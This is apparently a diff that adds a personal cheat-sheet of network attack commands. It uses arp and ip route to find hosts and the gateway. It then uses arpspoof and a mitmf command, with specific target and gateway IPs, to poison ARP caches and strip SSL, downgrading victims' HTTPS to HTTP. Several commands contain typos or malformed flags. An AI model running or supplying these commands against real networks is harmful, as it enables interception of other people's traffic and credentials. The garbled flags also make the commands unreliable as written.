@@ -1,0 +1,17 @@
+arp-a
+# displays IPS, MAC connected to the network
+
+ip route | grep default
+#to find default IP gateway
+
+arpspoof -t etho #interface -t[client IP] [gatewayIP]
+arpspoof it etho #interface -t[client IP] [gatewayIP]
+
+
+
+
+---------------------------------
+mitmf --arp -spoof --gateway 10.20.14.1 --target 10.20.14.206 i eth0
+#does ssl strip in MITMF 
+#down grade https to http 
+#exceptions - HSTS 
